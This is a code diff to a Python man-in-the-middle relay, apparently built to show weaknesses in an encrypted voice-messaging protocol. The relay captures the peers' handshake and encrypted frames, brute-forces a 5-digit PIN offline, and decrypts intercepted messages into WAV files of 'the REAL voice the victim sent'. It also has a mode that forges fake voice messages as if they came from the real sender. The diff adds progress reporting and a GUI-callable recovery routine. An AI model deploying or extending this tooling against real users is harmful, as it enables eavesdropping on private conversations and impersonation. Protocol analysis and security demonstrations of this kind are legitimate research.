@@ -73,7 +73,7 @@ class Intercepted:
         aes = AESLayer(aes_key)
         pcm = bytearray()
         meta: Optional[dict] = None
-        for seq, ct in self.frames_data:
+        for seq, ct in list(self.frames_data):          # snapshot: may still be filling
             pt = aes.decrypt(ct, P.data_nonce(self.direction_byte, seq),
                              P.data_aad(self.direction_byte, seq))
             kind, body = pt[0], pt[1:]
@@ -107,7 +107,7 @@ class InspectionRelay:
                  capture_dir: Optional[str] = "captures",
                  on_log: Callable[[str], None] = print,
                  fake_pcm: Optional[bytes] = None, fake_rate: int = 16000,
-                 pin_digits: int = 4, iterations: Optional[int] = None):
+                 pin_digits: int = 5, iterations: Optional[int] = None):
         if mode not in MODES:
             raise ValueError(f"mode must be one of {MODES}")
         self.listen_port, self.dest = listen_port, (dest_host, dest_port)
@@ -131,6 +131,9 @@ class InspectionRelay:
         self.cracked_pin: Optional[str] = None
         self.aes_key: Optional[bytes] = None
         self.recovered = []              # list[(Intercepted, pcm, rate)] after a crack
+        self.cracking = False            # True while the brute force is running (for the GUI)
+        self.crack_tries = 0
+        self.crack_total = 10 ** pin_digits
 
     # ---------------- capture ----------------
     def _record(self, direction: str, seq: int, ct: bytes) -> None:
@@ -175,12 +178,23 @@ class InspectionRelay:
         if self._crack_failed or not self._handshake_ready():
             return None
         h = dict(self._hs)
+        total = 10 ** self.pin_digits
+        self.crack_total, self.crack_tries, self.cracking = total, 0, True
         self.on_log(f"[relay] captured the handshake; brute-forcing the "
-                    f"{self.pin_digits}-digit PIN ({10 ** self.pin_digits:,} keys)…")
+                    f"{self.pin_digits}-digit PIN now ({total:,} keys)…")
+
+        def prog(tries: int) -> None:
+            self.crack_tries = tries
+            if tries % max(total // 4, 1) == 0:
+                self.on_log(f"[relay] brute force… {tries:,}/{total:,} ({tries * 100 // total}%)")
+
         r = analysis.brute_force_passphrase(
             h["name_i"], h["name_r"], h["nonce_i"], h["nonce_r"], h["proof_r"],
             role=b"R", iterations=self.iterations,
-            candidates=analysis.pin_candidates(self.pin_digits))
+            candidates=analysis.pin_candidates(self.pin_digits),
+            on_progress=prog, progress_every=max(total // 20, 1))
+        self.cracking = False
+        self.crack_tries = r["tries"]
         if not r["success"]:
             self._crack_failed = True
             self.on_log(f"[relay] brute force gave up after {r['tries']:,} guesses in "
@@ -222,16 +236,26 @@ class InspectionRelay:
         self.on_log(f"[relay] *** FORGED a fake voice message ({len(pcm)} bytes, "
                     f"{seq} frames) and sent it to the destination as the real source ***")
 
-    def _crack_and_recover(self) -> None:
-        """After serving (crack mode): brute-force the PIN and decrypt every
-        intercepted voice message into the real audio the victim sent."""
+    def recover_all(self) -> list:
+        """Brute-force the PIN (once) and decrypt every captured message into the
+        real audio the victim sent. Safe to call live from the GUI (e.g. the
+        'Decrypted' button) or automatically when the session ends."""
+        if not self.intercepted:
+            self.on_log("[relay] nothing captured yet — have the source send a message first")
+            return []
+        if not self._cracked and not self._handshake_ready():
+            self.on_log("[relay] handshake not captured yet — wait for the peers to connect")
+            return []
         key = self._ensure_cracked()
         if not key:
-            return
+            return []
         from .audio import save_wav
         if self.capture_dir:
             os.makedirs(self.capture_dir, exist_ok=True)
-        for i, m in enumerate(self.intercepted, 1):
+        with self._lock:
+            items = list(self.intercepted)
+        out = []
+        for i, m in enumerate(items, 1):
             try:
                 pcm, meta = m.decrypt(key)
             except Exception as e:                       # noqa: BLE001 (report and continue)
@@ -240,13 +264,16 @@ class InspectionRelay:
             if not pcm:
                 continue
             rate = int(meta.get("rate", 16000)) if meta else 16000
-            self.recovered.append((m, pcm, rate))
-            if self.capture_dir:
+            out.append((m, pcm, rate))
+            if self.capture_dir and not getattr(m, "_saved", False):
                 path = os.path.join(self.capture_dir, time.strftime(
                     f"recovered_%H%M%S_{i}.wav", time.localtime(m.started)))
                 save_wav(path, pcm, rate)
+                m._saved = True
                 self.on_log(f"[relay] decrypted the REAL voice the victim sent → {path} "
                             f"({len(pcm)} bytes, {len(pcm) / 2 / rate:.1f}s)")
+        self.recovered = out
+        return out
 
     def save_intercepted_wavs(self) -> None:
         if not self.capture_dir:
@@ -288,7 +315,7 @@ class InspectionRelay:
         srv.close()
         self.save_intercepted_wavs()
         if self.mode in ("crack", "forge"):
-            self._crack_and_recover()      # also lets the attacker hear the real message
+            self.recover_all()             # also lets the attacker hear the real message
         self.on_log(f"[relay] finished: {self.stats}")
         self.done.set()
 
